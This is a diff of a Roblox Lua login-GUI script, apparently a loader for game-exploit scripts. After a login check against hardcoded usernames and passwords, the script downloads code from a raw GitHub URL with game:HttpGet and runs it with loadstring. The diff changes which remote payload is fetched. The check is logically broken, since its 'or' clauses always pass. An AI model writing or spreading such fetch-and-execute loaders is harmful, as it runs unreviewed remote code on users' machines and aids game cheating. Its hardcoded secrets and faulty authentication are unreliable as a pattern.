@@ -87,7 +87,7 @@ TextLabel.TextWrapped = true
 TextLabel.TextXAlignment = Enum.TextXAlignment.Left
 TextLabel.TextYAlignment = Enum.TextYAlignment.Top
 
-local function VRGS_fake_script() -- login.LocalScript 
+local function NZDKYC_fake_script()
 	local script = Instance.new('LocalScript', login)
 
 	local UserData = script.Parent.Parent.Username 
@@ -97,11 +97,11 @@ local function VRGS_fake_script() -- login.LocalScript
 		if UserData.Text == "thatsiedutz" or "Eray.7" and UserPass.Text == "mambasit" or "Eray" then 
 			script.Parent.Parent.Visible = false 
 			wait(0.3)
-			loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/vpetru'),true))()
+			loadstring(game:HttpGet(('https://raw.githubusercontent.com/kl0nx/v3patru/main/lodi'),true))()
 		else
 			button.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
 		end 
 	end)
 	
 end
-coroutine.wrap(VRGS_fake_script)()
+coroutine.wrap(NZDKYC_fake_script)()
